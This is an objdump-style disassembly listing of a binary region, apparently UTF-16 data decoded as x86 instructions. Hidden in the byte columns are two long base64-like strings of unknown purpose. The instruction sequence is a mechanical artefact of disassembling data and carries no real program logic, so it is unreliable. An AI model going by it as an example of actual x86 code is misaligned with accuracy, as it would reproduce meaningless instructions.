  40b3f9:	00 33                	add    %dh,(%ebx)
  40b3fb:	00 4f 00             	add    %cl,0x0(%edi)
  40b3fe:	4c                   	dec    %esp
  40b3ff:	00 46 00             	add    %al,0x0(%esi)
  40b402:	53                   	push   %ebx
  40b403:	00 36                	add    %dh,(%esi)
  40b405:	00 76 00             	add    %dh,0x0(%esi)
  40b408:	46                   	inc    %esi
  40b409:	00 68 00             	add    %ch,0x0(%eax)
  40b40c:	72 00                	jb     0x40b40e
  40b40e:	34 00                	xor    $0x0,%al
  40b410:	62 00                	bound  %eax,(%eax)
  40b412:	68 00 31 00 5a       	push   $0x5a003100
  40b417:	00 4f 00             	add    %cl,0x0(%edi)
  40b41a:	57                   	push   %edi
  40b41b:	00 6f 00             	add    %ch,0x0(%edi)
  40b41e:	35 00 46 00 4f       	xor    $0x4f004600,%eax
  40b423:	00 56 00             	add    %dl,0x0(%esi)
  40b426:	75 00                	jne    0x40b428
  40b428:	67 00 4e 00          	add    %cl,0x0(%bp)
  40b42c:	51                   	push   %ecx
  40b42d:	00 62 00             	add    %ah,0x0(%edx)
  40b430:	69 00 54 00 71 00    	imul   $0x710054,(%eax),%eax
  40b436:	52                   	push   %edx
  40b437:	00 4f 00             	add    %cl,0x0(%edi)
  40b43a:	76 00                	jbe    0x40b43c
  40b43c:	37                   	aaa
  40b43d:	00 4a 00             	add    %cl,0x0(%edx)
  40b440:	45                   	inc    %ebp
  40b441:	00 75 00             	add    %dh,0x0(%ebp)
  40b444:	66 00 4c 00 39       	data16 add %cl,0x39(%eax,%eax,1)
  40b449:	00 63 00             	add    %ah,0x0(%ebx)
  40b44c:	57                   	push   %edi
  40b44d:	00 6e 00             	add    %ch,0x0(%esi)
  40b450:	67 00 6e 00          	add    %ch,0x0(%bp)
  40b454:	46                   	inc    %esi
  40b455:	00 4f 00             	add    %cl,0x0(%edi)
  40b458:	79 00                	jns    0x40b45a
  40b45a:	6c                   	insb   (%dx),%es:(%edi)
  40b45b:	00 5a 00             	add    %bl,0x0(%edx)
  40b45e:	48                   	dec    %eax
  40b45f:	00 69 00             	add    %ch,0x0(%ecx)
  40b462:	7a 00                	jp     0x40b464
  40b464:	34 00                	xor    $0x0,%al
  40b466:	33 00                	xor    (%eax),%eax
  40b468:	50                   	push   %eax
  40b469:	00 2f                	add    %ch,(%edi)
  40b46b:	00 72 00             	add    %dh,0x0(%edx)
  40b46e:	61                   	popa
  40b46f:	00 46 00             	add    %al,0x0(%esi)
  40b472:	44                   	inc    %esp
  40b473:	00 75 00             	add    %dh,0x0(%ebp)
  40b476:	41                   	inc    %ecx
  40b477:	00 52 00             	add    %dl,0x0(%edx)
  40b47a:	7a 00                	jp     0x40b47c
  40b47c:	43                   	inc    %ebx
  40b47d:	00 6e 00             	add    %ch,0x0(%esi)
  40b480:	58                   	pop    %eax
  40b481:	00 63 00             	add    %ah,0x0(%ebx)
  40b484:	38 00                	cmp    %al,(%eax)
  40b486:	54                   	push   %esp
  40b487:	00 6f 00             	add    %ch,0x0(%edi)
  40b48a:	52                   	push   %edx
  40b48b:	00 58 00             	add    %bl,0x0(%eax)
  40b48e:	6f                   	outsl  %ds:(%esi),(%dx)
  40b48f:	00 67 00             	add    %ah,0x0(%edi)
  40b492:	53                   	push   %ebx
  40b493:	00 37                	add    %dh,(%edi)
  40b495:	00 30                	add    %dh,(%eax)
  40b497:	00 75 00             	add    %dh,0x0(%ebp)
  40b49a:	2b 00                	sub    (%eax),%eax
  40b49c:	54                   	push   %esp
  40b49d:	00 32                	add    %dh,(%edx)
  40b49f:	00 61 00             	add    %ah,0x0(%ecx)
  40b4a2:	78 00                	js     0x40b4a4
  40b4a4:	67 00 63 00          	add    %ah,0x0(%bp,%di)
  40b4a8:	36 00 61 00          	add    %ah,%ss:0x0(%ecx)
  40b4ac:	4e                   	dec    %esi
  40b4ad:	00 42 00             	add    %al,0x0(%edx)
  40b4b0:	30 00                	xor    %al,(%eax)
  40b4b2:	43                   	inc    %ebx
  40b4b3:	00 6f 00             	add    %ch,0x0(%edi)
  40b4b6:	43                   	inc    %ebx
  40b4b7:	00 58 00             	add    %bl,0x0(%eax)
  40b4ba:	66 00 76 00          	data16 add %dh,0x0(%esi)
  40b4be:	66 00 66 00          	data16 add %ah,0x0(%esi)
  40b4c2:	5a                   	pop    %edx
  40b4c3:	00 2b                	add    %ch,(%ebx)
  40b4c5:	00 32                	add    %dh,(%edx)
  40b4c7:	00 30                	add    %dh,(%eax)
  40b4c9:	00 75 00             	add    %dh,0x0(%ebp)
  40b4cc:	50                   	push   %eax
  40b4cd:	00 32                	add    %dh,(%edx)
  40b4cf:	00 31                	add    %dh,(%ecx)
  40b4d1:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b4d4:	32 00                	xor    (%eax),%al
  40b4d6:	6e                   	outsb  %ds:(%esi),(%dx)
  40b4d7:	00 6a 00             	add    %ch,0x0(%edx)
  40b4da:	6e                   	outsb  %ds:(%esi),(%dx)
  40b4db:	00 6b 00             	add    %ch,0x0(%ebx)
  40b4de:	30 00                	xor    %al,(%eax)
  40b4e0:	59                   	pop    %ecx
  40b4e1:	00 4f 00             	add    %cl,0x0(%edi)
  40b4e4:	67 00 7a 00          	add    %bh,0x0(%bp,%si)
  40b4e8:	32 00                	xor    (%eax),%al
  40b4ea:	44                   	inc    %esp
  40b4eb:	00 4e 00             	add    %cl,0x0(%esi)
  40b4ee:	75 00                	jne    0x40b4f0
  40b4f0:	41                   	inc    %ecx
  40b4f1:	00 64 00 6b          	add    %ah,0x6b(%eax,%eax,1)
  40b4f5:	00 43 00             	add    %al,0x0(%ebx)
  40b4f8:	55                   	push   %ebp
  40b4f9:	00 53 00             	add    %dl,0x0(%ebx)
  40b4fc:	54                   	push   %esp
  40b4fd:	00 2b                	add    %ch,(%ebx)
  40b4ff:	00 4b 00             	add    %cl,0x0(%ebx)
  40b502:	69 00 74 00 33 00    	imul   $0x330074,(%eax),%eax
  40b508:	5a                   	pop    %edx
  40b509:	00 4f 00             	add    %cl,0x0(%edi)
  40b50c:	56                   	push   %esi
  40b50d:	00 53 00             	add    %dl,0x0(%ebx)
  40b510:	42                   	inc    %edx
  40b511:	00 37                	add    %dh,(%edi)
  40b513:	00 6d 00             	add    %ch,0x0(%ebp)
  40b516:	39 00                	cmp    %eax,(%eax)
  40b518:	47                   	inc    %edi
  40b519:	00 70 00             	add    %dh,0x0(%eax)
  40b51c:	55                   	push   %ebp
  40b51d:	00 50 00             	add    %dl,0x0(%eax)
  40b520:	4e                   	dec    %esi
  40b521:	00 6d 00             	add    %ch,0x0(%ebp)
  40b524:	49                   	dec    %ecx
  40b525:	00 57 00             	add    %dl,0x0(%edi)
  40b528:	70 00                	jo     0x40b52a
  40b52a:	51                   	push   %ecx
  40b52b:	00 67 00             	add    %ah,0x0(%edi)
  40b52e:	71 00                	jno    0x40b530
  40b530:	4c                   	dec    %esp
  40b531:	00 33                	add    %dh,(%ebx)
  40b533:	00 4e 00             	add    %cl,0x0(%esi)
  40b536:	5a                   	pop    %edx
  40b537:	00 65 00             	add    %ah,0x0(%ebp)
  40b53a:	45                   	inc    %ebp
  40b53b:	00 41 00             	add    %al,0x0(%ecx)
  40b53e:	71 00                	jno    0x40b540
  40b540:	4e                   	dec    %esi
  40b541:	00 4e 00             	add    %cl,0x0(%esi)
  40b544:	42                   	inc    %edx
  40b545:	00 4c 00 54          	add    %cl,0x54(%eax,%eax,1)
  40b549:	00 42 00             	add    %al,0x0(%edx)
  40b54c:	2b 00                	sub    (%eax),%eax
  40b54e:	6a 00                	push   $0x0
  40b550:	74 00                	je     0x40b552
  40b552:	42                   	inc    %edx
  40b553:	00 53 00             	add    %dl,0x0(%ebx)
  40b556:	6b 00 4d             	imul   $0x4d,(%eax),%eax
  40b559:	00 63 00             	add    %ah,0x0(%ebx)
  40b55c:	4d                   	dec    %ebp
  40b55d:	00 6d 00             	add    %ch,0x0(%ebp)
  40b560:	36 00 66 00          	add    %ah,%ss:0x0(%esi)
  40b564:	4c                   	dec    %esp
  40b565:	00 37                	add    %dh,(%edi)
  40b567:	00 72 00             	add    %dh,0x0(%edx)
  40b56a:	39 00                	cmp    %eax,(%eax)
  40b56c:	35 00 41 00 46       	xor    $0x46004100,%eax
  40b571:	00 6f 00             	add    %ch,0x0(%edi)
  40b574:	7a 00                	jp     0x40b576
  40b576:	4c                   	dec    %esp
  40b577:	00 4f 00             	add    %cl,0x0(%edi)
  40b57a:	39 00                	cmp    %eax,(%eax)
  40b57c:	52                   	push   %edx
  40b57d:	00 37                	add    %dh,(%edi)
  40b57f:	00 37                	add    %dh,(%edi)
  40b581:	00 6a 00             	add    %ch,0x0(%edx)
  40b584:	51                   	push   %ecx
  40b585:	00 65 00             	add    %ah,0x0(%ebp)
  40b588:	31 00                	xor    %eax,(%eax)
  40b58a:	6b 00 79             	imul   $0x79,(%eax),%eax
  40b58d:	00 36                	add    %dh,(%esi)
  40b58f:	00 57 00             	add    %dl,0x0(%edi)
  40b592:	6d                   	insl   (%dx),%es:(%edi)
  40b593:	00 45 00             	add    %al,0x0(%ebp)
  40b596:	61                   	popa
  40b597:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b59a:	49                   	dec    %ecx
  40b59b:	00 6d 00             	add    %ch,0x0(%ebp)
  40b59e:	56                   	push   %esi
  40b59f:	00 2f                	add    %ch,(%edi)
  40b5a1:	00 4b 00             	add    %cl,0x0(%ebx)
  40b5a4:	4e                   	dec    %esi
  40b5a5:	00 75 00             	add    %dh,0x0(%ebp)
  40b5a8:	35 00 6c 00 4a       	xor    $0x4a006c00,%eax
  40b5ad:	00 6c 00 57          	add    %ch,0x57(%eax,%eax,1)
  40b5b1:	00 6f 00             	add    %ch,0x0(%edi)
  40b5b4:	70 00                	jo     0x40b5b6
  40b5b6:	42                   	inc    %edx
  40b5b7:	00 4e 00             	add    %cl,0x0(%esi)
  40b5ba:	50                   	push   %eax
  40b5bb:	00 4f 00             	add    %cl,0x0(%edi)
  40b5be:	31 00                	xor    %eax,(%eax)
  40b5c0:	31 00                	xor    %eax,(%eax)
  40b5c2:	4e                   	dec    %esi
  40b5c3:	00 39                	add    %bh,(%ecx)
  40b5c5:	00 4a 00             	add    %cl,0x0(%edx)
  40b5c8:	36 00 76 00          	add    %dh,%ss:0x0(%esi)
  40b5cc:	73 00                	jae    0x40b5ce
  40b5ce:	39 00                	cmp    %eax,(%eax)
  40b5d0:	68 00 49 00 33       	push   $0x33004900
  40b5d5:	00 44 00 4d          	add    %al,0x4d(%eax,%eax,1)
  40b5d9:	00 42 00             	add    %al,0x0(%edx)
  40b5dc:	74 00                	je     0x40b5de
  40b5de:	35 00 71 00 61       	xor    $0x61007100,%eax
  40b5e3:	00 32                	add    %dh,(%edx)
  40b5e5:	00 6e 00             	add    %ch,0x0(%esi)
  40b5e8:	6f                   	outsl  %ds:(%esi),(%dx)
  40b5e9:	00 5a 00             	add    %bl,0x0(%edx)
  40b5ec:	41                   	inc    %ecx
  40b5ed:	00 76 00             	add    %dh,0x0(%esi)
  40b5f0:	51                   	push   %ecx
  40b5f1:	00 77 00             	add    %dh,0x0(%edi)
  40b5f4:	31 00                	xor    %eax,(%eax)
  40b5f6:	37                   	aaa
  40b5f7:	00 32                	add    %dh,(%edx)
  40b5f9:	00 56 00             	add    %dl,0x0(%esi)
  40b5fc:	68 00 4e 00 58       	push   $0x58004e00
  40b601:	00 63 00             	add    %ah,0x0(%ebx)
  40b604:	55                   	push   %ebp
  40b605:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b608:	73 00                	jae    0x40b60a
  40b60a:	2b 00                	sub    (%eax),%eax
  40b60c:	58                   	pop    %eax
  40b60d:	00 76 00             	add    %dh,0x0(%esi)
  40b610:	4f                   	dec    %edi
  40b611:	00 56 00             	add    %dl,0x0(%esi)
  40b614:	66 00 4b 00          	data16 add %cl,0x0(%ebx)
  40b618:	6c                   	insb   (%dx),%es:(%edi)
  40b619:	00 7a 00             	add    %bh,0x0(%edx)
  40b61c:	42                   	inc    %edx
  40b61d:	00 57 00             	add    %dl,0x0(%edi)
  40b620:	37                   	aaa
  40b621:	00 30                	add    %dh,(%eax)
  40b623:	00 2b                	add    %ch,(%ebx)
  40b625:	00 33                	add    %dh,(%ebx)
  40b627:	00 69 00             	add    %ch,0x0(%ecx)
  40b62a:	69 00 71 00 6b 00    	imul   $0x6b0071,(%eax),%eax
  40b630:	50                   	push   %eax
  40b631:	00 4b 00             	add    %cl,0x0(%ebx)
  40b634:	66 00 79 00          	data16 add %bh,0x0(%ecx)
  40b638:	73 00                	jae    0x40b63a
  40b63a:	6f                   	outsl  %ds:(%esi),(%dx)
  40b63b:	00 3d 00 00 87 b1    	add    %bh,0xb1870000
  40b641:	4a                   	dec    %edx
  40b642:	00 35 00 52 00 4f    	add    %dh,0x4f005200
  40b648:	00 55 00             	add    %dl,0x0(%ebp)
  40b64b:	50                   	push   %eax
  40b64c:	00 50 00             	add    %dl,0x0(%eax)
  40b64f:	55                   	push   %ebp
  40b650:	00 6a 00             	add    %ch,0x0(%edx)
  40b653:	50                   	push   %eax
  40b654:	00 45 00             	add    %al,0x0(%ebp)
  40b657:	58                   	pop    %eax
  40b658:	00 63 00             	add    %ah,0x0(%ebx)
  40b65b:	74 00                	je     0x40b65d
  40b65d:	48                   	dec    %eax
  40b65e:	00 73 00             	add    %dh,0x0(%ebx)
  40b661:	71 00                	jno    0x40b663
  40b663:	42                   	inc    %edx
  40b664:	00 69 00             	add    %ch,0x0(%ecx)
  40b667:	33 00                	xor    (%eax),%eax
  40b669:	37                   	aaa
  40b66a:	00 6d 00             	add    %ch,0x0(%ebp)
  40b66d:	35 00 45 00 4c       	xor    $0x4c004500,%eax
  40b672:	00 2f                	add    %ch,(%edi)
  40b674:	00 53 00             	add    %dl,0x0(%ebx)
  40b677:	33 00                	xor    (%eax),%eax
  40b679:	30 00                	xor    %al,(%eax)
  40b67b:	6a 00                	push   $0x0
  40b67d:	44                   	inc    %esp
  40b67e:	00 76 00             	add    %dh,0x0(%esi)
  40b681:	79 00                	jns    0x40b683
  40b683:	6b 00 42             	imul   $0x42,(%eax),%eax
  40b686:	00 30                	add    %dh,(%eax)
  40b688:	00 7a 00             	add    %bh,0x0(%edx)
  40b68b:	49                   	dec    %ecx
  40b68c:	00 7a 00             	add    %bh,0x0(%edx)
  40b68f:	69 00 32 00 74 00    	imul   $0x740032,(%eax),%eax
  40b695:	50                   	push   %eax
  40b696:	00 38                	add    %bh,(%eax)
  40b698:	00 37                	add    %dh,(%edi)
  40b69a:	00 77 00             	add    %dh,0x0(%edi)
  40b69d:	75 00                	jne    0x40b69f
  40b69f:	47                   	inc    %edi
  40b6a0:	00 6e 00             	add    %ch,0x0(%esi)
  40b6a3:	54                   	push   %esp
  40b6a4:	00 70 00             	add    %dh,0x0(%eax)
  40b6a7:	62 00                	bound  %eax,(%eax)
  40b6a9:	6e                   	outsb  %ds:(%esi),(%dx)
  40b6aa:	00 35 00 44 00 59    	add    %dh,0x59004400
  40b6b0:	00 78 00             	add    %bh,0x0(%eax)
  40b6b3:	76 00                	jbe    0x40b6b5
  40b6b5:	78 00                	js     0x40b6b7
  40b6b7:	4a                   	dec    %edx
  40b6b8:	00 65 00             	add    %ah,0x0(%ebp)
  40b6bb:	51                   	push   %ecx
  40b6bc:	00 78 00             	add    %bh,0x0(%eax)
  40b6bf:	35 00 6d 00 4d       	xor    $0x4d006d00,%eax
  40b6c4:	00 39                	add    %bh,(%ecx)
  40b6c6:	00 6f 00             	add    %ch,0x0(%edi)
  40b6c9:	44                   	inc    %esp
  40b6ca:	00 72 00             	add    %dh,0x0(%edx)
  40b6cd:	4a                   	dec    %edx
  40b6ce:	00 2b                	add    %ch,(%ebx)
  40b6d0:	00 4f 00             	add    %cl,0x0(%edi)
  40b6d3:	45                   	inc    %ebp
  40b6d4:	00 41 00             	add    %al,0x0(%ecx)
  40b6d7:	77 00                	ja     0x40b6d9
  40b6d9:	54                   	push   %esp
  40b6da:	00 45 00             	add    %al,0x0(%ebp)
  40b6dd:	76 00                	jbe    0x40b6df
  40b6df:	6e                   	outsb  %ds:(%esi),(%dx)
  40b6e0:	00 63 00             	add    %ah,0x0(%ebx)
  40b6e3:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
  40b6e7:	66 00 71 00          	data16 add %dh,0x0(%ecx)
  40b6eb:	38 00                	cmp    %al,(%eax)
  40b6ed:	67 00 2f             	add    %ch,(%bx)
  40b6f0:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b6f3:	5a                   	pop    %edx
  40b6f4:	00 79 00             	add    %bh,0x0(%ecx)
  40b6f7:	62 00                	bound  %eax,(%eax)
  40b6f9:	59                   	pop    %ecx
  40b6fa:	00 6e 00             	add    %ch,0x0(%esi)
  40b6fd:	69 00 61 00 5a 00    	imul   $0x5a0061,(%eax),%eax
  40b703:	72 00                	jb     0x40b705
  40b705:	47                   	inc    %edi
  40b706:	00 51 00             	add    %dl,0x0(%ecx)
  40b709:	33 00                	xor    (%eax),%eax
  40b70b:	6c                   	insb   (%dx),%es:(%edi)
  40b70c:	00 30                	add    %dh,(%eax)
  40b70e:	00 63 00             	add    %ah,0x0(%ebx)
  40b711:	6b 00 42             	imul   $0x42,(%eax),%eax
  40b714:	00 51 00             	add    %dl,0x0(%ecx)
  40b717:	4f                   	dec    %edi
  40b718:	00 33                	add    %dh,(%ebx)
  40b71a:	00 58 00             	add    %bl,0x0(%eax)
  40b71d:	6d                   	insl   (%dx),%es:(%edi)
  40b71e:	00 73 00             	add    %dh,0x0(%ebx)
  40b721:	37                   	aaa
  40b722:	00 64 00 36          	add    %ah,0x36(%eax,%eax,1)
  40b726:	00 53 00             	add    %dl,0x0(%ebx)
  40b729:	6a 00                	push   $0x0
  40b72b:	57                   	push   %edi
  40b72c:	00 6d 00             	add    %ch,0x0(%ebp)
  40b72f:	66 00 5a 00          	data16 add %bl,0x0(%edx)
  40b733:	6f                   	outsl  %ds:(%esi),(%dx)
  40b734:	00 4a 00             	add    %cl,0x0(%edx)
  40b737:	30 00                	xor    %al,(%eax)
  40b739:	75 00                	jne    0x40b73b
  40b73b:	7a 00                	jp     0x40b73d
  40b73d:	53                   	push   %ebx
  40b73e:	00 76 00             	add    %dh,0x0(%esi)
  40b741:	68 00 71 00 53       	push   $0x53007100
  40b746:	00 79 00             	add    %bh,0x0(%ecx)
  40b749:	6a 00                	push   $0x0
  40b74b:	51                   	push   %ecx
  40b74c:	00 59 00             	add    %bl,0x0(%ecx)
  40b74f:	6e                   	outsb  %ds:(%esi),(%dx)
  40b750:	00 47 00             	add    %al,0x0(%edi)
  40b753:	49                   	dec    %ecx
  40b754:	00 64 00 4f          	add    %ah,0x4f(%eax,%eax,1)
  40b758:	00 56 00             	add    %dl,0x0(%esi)
  40b75b:	5a                   	pop    %edx
  40b75c:	00 50 00             	add    %dl,0x0(%eax)
  40b75f:	53                   	push   %ebx
  40b760:	00 7a 00             	add    %bh,0x0(%edx)
  40b763:	62 00                	bound  %eax,(%eax)
  40b765:	79 00                	jns    0x40b767
  40b767:	49                   	dec    %ecx
  40b768:	00 49 00             	add    %cl,0x0(%ecx)
  40b76b:	52                   	push   %edx
  40b76c:	00 47 00             	add    %al,0x0(%edi)
  40b76f:	49                   	dec    %ecx
  40b770:	00 61 00             	add    %ah,0x0(%ecx)
  40b773:	30 00                	xor    %al,(%eax)
  40b775:	36 00 54 00 6b       	add    %dl,%ss:0x6b(%eax,%eax,1)
  40b77a:	00 4b 00             	add    %cl,0x0(%ebx)
  40b77d:	6a 00                	push   $0x0
  40b77f:	4d                   	dec    %ebp
  40b780:	00 42 00             	add    %al,0x0(%edx)
  40b783:	57                   	push   %edi
  40b784:	00 76 00             	add    %dh,0x0(%esi)
  40b787:	63 00                	arpl   %eax,(%eax)
  40b789:	46                   	inc    %esi
  40b78a:	00 65 00             	add    %ah,0x0(%ebp)
  40b78d:	57                   	push   %edi
  40b78e:	00 53 00             	add    %dl,0x0(%ebx)
  40b791:	58                   	pop    %eax
  40b792:	00 38                	add    %bh,(%eax)
  40b794:	00 51 00             	add    %dl,0x0(%ecx)
  40b797:	58                   	pop    %eax
  40b798:	00 7a 00             	add    %bh,0x0(%edx)
  40b79b:	44                   	inc    %esp
  40b79c:	00 2b                	add    %ch,(%ebx)
  40b79e:	00 47 00             	add    %al,0x0(%edi)
  40b7a1:	4d                   	dec    %ebp
  40b7a2:	00 35 00 46 00 68    	add    %dh,0x68004600
  40b7a8:	00 58 00             	add    %bl,0x0(%eax)
  40b7ab:	75 00                	jne    0x40b7ad
  40b7ad:	77 00                	ja     0x40b7af
  40b7af:	35 00 4e 00 64       	xor    $0x64004e00,%eax
  40b7b4:	00 68 00             	add    %ch,0x0(%eax)
  40b7b7:	59                   	pop    %ecx
  40b7b8:	00 73 00             	add    %dh,0x0(%ebx)
  40b7bb:	62 00                	bound  %eax,(%eax)
  40b7bd:	70 00                	jo     0x40b7bf
  40b7bf:	37                   	aaa
  40b7c0:	00 35 00 46 00 39    	add    %dh,0x39004600
  40b7c6:	00 36                	add    %dh,(%esi)
  40b7c8:	00 6e 00             	add    %ch,0x0(%esi)
  40b7cb:	79 00                	jns    0x40b7cd
  40b7cd:	66 00 7a 00          	data16 add %bh,0x0(%edx)
  40b7d1:	6b 00 75             	imul   $0x75,(%eax),%eax
  40b7d4:	00 54 00 50          	add    %dl,0x50(%eax,%eax,1)
  40b7d8:	00 6b 00             	add    %ch,0x0(%ebx)
  40b7db:	69 00 68 00 42 00    	imul   $0x420068,(%eax),%eax
  40b7e1:	69 00 63 00 53 00    	imul   $0x530063,(%eax),%eax
  40b7e7:	35 00 63 00 7a       	xor    $0x7a006300,%eax
  40b7ec:	00 52 00             	add    %dl,0x0(%edx)
  40b7ef:	6b 00 47             	imul   $0x47,(%eax),%eax
  40b7f2:	00 54 00 36          	add    %dl,0x36(%eax,%eax,1)
  40b7f6:	00 69 00             	add    %ch,0x0(%ecx)
  40b7f9:	75 00                	jne    0x40b7fb
  40b7fb:	75 00                	jne    0x40b7fd
  40b7fd:	63 00                	arpl   %eax,(%eax)
  40b7ff:	37                   	aaa
  40b800:	00 6e 00             	add    %ch,0x0(%esi)
  40b803:	76 00                	jbe    0x40b805
  40b805:	36 00 39             	add    %bh,%ss:(%ecx)
  40b808:	00 77 00             	add    %dh,0x0(%edi)
  40b80b:	63 00                	arpl   %eax,(%eax)
  40b80d:	2f                   	das
  40b80e:	00 78 00             	add    %bh,0x0(%eax)
  40b811:	38 00                	cmp    %al,(%eax)
  40b813:	2b 00                	sub    (%eax),%eax
  40b815:	61                   	popa
  40b816:	00 77 00             	add    %dh,0x0(%edi)
  40b819:	33 00                	xor    (%eax),%eax
  40b81b:	38 00                	cmp    %al,(%eax)
  40b81d:	66 00 67 00          	data16 add %ah,0x0(%edi)
  40b821:	4b                   	dec    %ebx
  40b822:	00 4b 00             	add    %cl,0x0(%ebx)
  40b825:	56                   	push   %esi
  40b826:	00 6e 00             	add    %ch,0x0(%esi)
  40b829:	72 00                	jb     0x40b82b
  40b82b:	4e                   	dec    %esi
  40b82c:	00 49 00             	add    %cl,0x0(%ecx)
  40b82f:	52                   	push   %edx
  40b830:	00 65 00             	add    %ah,0x0(%ebp)
  40b833:	6a 00                	push   $0x0
  40b835:	51                   	push   %ecx
  40b836:	00 7a 00             	add    %bh,0x0(%edx)
  40b839:	47                   	inc    %edi
  40b83a:	00 54 00 5a          	add    %dl,0x5a(%eax,%eax,1)
  40b83e:	00 51 00             	add    %dl,0x0(%ecx)
  40b841:	6c                   	insb   (%dx),%es:(%edi)
  40b842:	00 33                	add    %dh,(%ebx)
  40b844:	00 6a 00             	add    %ch,0x0(%edx)
  40b847:	73 00                	jae    0x40b849
  40b849:	58                   	pop    %eax
  40b84a:	00 6d 00             	add    %ch,0x0(%ebp)
  40b84d:	75 00                	jne    0x40b84f
  40b84f:	5a                   	pop    %edx
  40b850:	00 73 00             	add    %dh,0x0(%ebx)
  40b853:	2f                   	das
  40b854:	00 62 00             	add    %ah,0x0(%edx)
  40b857:	6d                   	insl   (%dx),%es:(%edi)
  40b858:	00 32                	add    %dh,(%edx)
  40b85a:	00 73 00             	add    %dh,0x0(%ebx)
  40b85d:	41                   	inc    %ecx
  40b85e:	00 61 00             	add    %ah,0x0(%ecx)
  40b861:	4f                   	dec    %edi
  40b862:	00 65 00             	add    %ah,0x0(%ebp)
  40b865:	47                   	inc    %edi
  40b866:	00 4c 00 30          	add    %cl,0x30(%eax,%eax,1)
  40b86a:	00 47 00             	add    %al,0x0(%edi)
  40b86d:	78 00                	js     0x40b86f
  40b86f:	33 00                	xor    (%eax),%eax
  40b871:	39 00                	cmp    %eax,(%eax)
  40b873:	2b 00                	sub    (%eax),%eax
  40b875:	51                   	push   %ecx
  40b876:	00 49 00             	add    %cl,0x0(%ecx)
  40b879:	54                   	push   %esp
  40b87a:	00 49 00             	add    %cl,0x0(%ecx)
  40b87d:	6f                   	outsl  %ds:(%esi),(%dx)
  40b87e:	00 55 00             	add    %dl,0x0(%ebp)
  40b881:	6c                   	insb   (%dx),%es:(%edi)
  40b882:	00 72 00             	add    %dh,0x0(%edx)
  40b885:	36 00 5a 00          	add    %bl,%ss:0x0(%edx)
  40b889:	50                   	push   %eax
  40b88a:	00 76 00             	add    %dh,0x0(%esi)
  40b88d:	65 00 79 00          	add    %bh,%gs:0x0(%ecx)
  40b891:	4e                   	dec    %esi
  40b892:	00 59 00             	add    %bl,0x0(%ecx)
  40b895:	37                   	aaa
  40b896:	00 77 00             	add    %dh,0x0(%edi)
  40b899:	4f                   	dec    %edi
  40b89a:	00 45 00             	add    %al,0x0(%ebp)
  40b89d:	5a                   	pop    %edx
  40b89e:	00 57 00             	add    %dl,0x0(%edi)
  40b8a1:	4b                   	dec    %ebx
  40b8a2:	00 6a 00             	add    %ch,0x0(%edx)
  40b8a5:	57                   	push   %edi
  40b8a6:	00 72 00             	add    %dh,0x0(%edx)
  40b8a9:	55                   	push   %ebp
  40b8aa:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b8ad:	64 00 72 00          	add    %dh,%fs:0x0(%edx)
  40b8b1:	4a                   	dec    %edx
  40b8b2:	00 56 00             	add    %dl,0x0(%esi)
  40b8b5:	6a 00                	push   $0x0
  40b8b7:	30 00                	xor    %al,(%eax)
  40b8b9:	70 00                	jo     0x40b8bb
  40b8bb:	5a                   	pop    %edx
  40b8bc:	00 58 00             	add    %bl,0x0(%eax)
  40b8bf:	5a                   	pop    %edx
  40b8c0:	00 76 00             	add    %dh,0x0(%esi)
  40b8c3:	65 00 37             	add    %dh,%gs:(%edi)
  40b8c6:	00 39                	add    %bh,(%ecx)
  40b8c8:	00 4b 00             	add    %cl,0x0(%ebx)
  40b8cb:	6f                   	outsl  %ds:(%esi),(%dx)
  40b8cc:	00 33                	add    %dh,(%ebx)
  40b8ce:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b8d1:	35 00 61 00 43       	xor    $0x43006100,%eax
  40b8d6:	00 54 00 65          	add    %dl,0x65(%eax,%eax,1)
  40b8da:	00 78 00             	add    %bh,0x0(%eax)
  40b8dd:	63 00                	arpl   %eax,(%eax)
  40b8df:	58                   	pop    %eax
  40b8e0:	00 30                	add    %dh,(%eax)
  40b8e2:	00 57 00             	add    %dl,0x0(%edi)
  40b8e5:	41                   	inc    %ecx
  40b8e6:	00 56 00             	add    %dl,0x0(%esi)
  40b8e9:	33 00                	xor    (%eax),%eax
  40b8eb:	4c                   	dec    %esp
  40b8ec:	00 44 00 32          	add    %al,0x32(%eax,%eax,1)
  40b8f0:	00 30                	add    %dh,(%eax)
  40b8f2:	00 77 00             	add    %dh,0x0(%edi)
  40b8f5:	49                   	dec    %ecx
  40b8f6:	00 4a 00             	add    %cl,0x0(%edx)
  40b8f9:	4c                   	dec    %esp
  40b8fa:	00 49 00             	add    %cl,0x0(%ecx)
  40b8fd:	4a                   	dec    %edx
  40b8fe:	00 63 00             	add    %ah,0x0(%ebx)
  40b901:	70 00                	jo     0x40b903
  40b903:	4f                   	dec    %edi
  40b904:	00 5a 00             	add    %bl,0x0(%edx)
  40b907:	4d                   	dec    %ebp
  40b908:	00 38                	add    %bh,(%eax)
  40b90a:	00 51 00             	add    %dl,0x0(%ecx)
  40b90d:	6f                   	outsl  %ds:(%esi),(%dx)
  40b90e:	00 48 00             	add    %cl,0x0(%eax)
  40b911:	53                   	push   %ebx
  40b912:	00 2b                	add    %ch,(%ebx)
  40b914:	00 77 00             	add    %dh,0x0(%edi)
  40b917:	72 00                	jb     0x40b919
  40b919:	43                   	inc    %ebx
  40b91a:	00 51 00             	add    %dl,0x0(%ecx)
  40b91d:	63 00                	arpl   %eax,(%eax)
  40b91f:	39 00                	cmp    %eax,(%eax)
  40b921:	30 00                	xor    %al,(%eax)
  40b923:	49                   	dec    %ecx
  40b924:	00 30                	add    %dh,(%eax)
  40b926:	00 48 00             	add    %cl,0x0(%eax)
  40b929:	4b                   	dec    %ebx
  40b92a:	00 2b                	add    %ch,(%ebx)
  40b92c:	00 6e 00             	add    %ch,0x0(%esi)
  40b92f:	35 00 57 00 53       	xor    $0x53005700,%eax
  40b934:	00 66 00             	add    %ah,0x0(%esi)
  40b937:	51                   	push   %ecx
  40b938:	00 45 00             	add    %al,0x0(%ebp)
  40b93b:	55                   	push   %ebp
  40b93c:	00 43 00             	add    %al,0x0(%ebx)
  40b93f:	6e                   	outsb  %ds:(%esi),(%dx)
  40b940:	00 6e 00             	add    %ch,0x0(%esi)
  40b943:	32 00                	xor    (%eax),%al
  40b945:	70 00                	jo     0x40b947
  40b947:	58                   	pop    %eax
